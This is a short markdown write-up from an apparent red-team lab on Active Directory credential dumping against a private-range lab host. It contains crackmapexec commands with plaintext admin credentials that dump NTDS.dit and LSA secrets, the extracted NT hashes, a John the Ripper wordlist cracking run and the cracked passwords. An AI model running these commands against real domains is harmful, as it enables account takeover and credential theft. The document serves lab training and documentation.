### **File: `01-Red-Team-Attack/Privilege-Escalation.md`**
```markdown
# ⬆️ Privilege Escalation & Credential Dumping

## Objective
With Domain Admin access, extract all domain user password hashes.

## Commands Used
```bash
# Dump NTDS.dit (all domain hashes)
crackmapexec smb 192.168.56.10 -u 'Administrator' -p 'password@123' --ntds

# Dump LSA secrets
crackmapexec smb 192.168.56.10 -u 'Administrator' -p 'password@123' --lsa
Extracted Hashes
text
Administrator:500:6de00c52dbabb0e95c074e3006fcf36e
krbtgt:502:bcfb72e4c6b618fc1fc6b736c895d854
john.doe:1103:a29f7623fd11550def0192de9246f46b
it.admin:1104:570a9a65db8fba761c1008a51d4c95ab
svc.backup:1105:ebf13990fc7777d1deeec286923901c7
Password Cracking
bash
# Create hash file
cat > hashes.txt << EOF
Administrator:500:6de00c52dbabb0e95c074e3006fcf36e
john.doe:1103:a29f7623fd11550def0192de9246f46b
it.admin:1104:570a9a65db8fba761c1008a51d4c95ab
svc.backup:1105:ebf13990fc7777d1deeec286923901c7
EOF

# Crack with John
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
Cracked Passwords
User	Hash	Password
Administrator	6de00c52...	password@123
john.doe	a29f7623...	Password123
it.admin	570a9a65...	Admin@123
📸 Evidence
https://screenshots/ntds-dump.png
https://screenshots/cracked-hashes.png
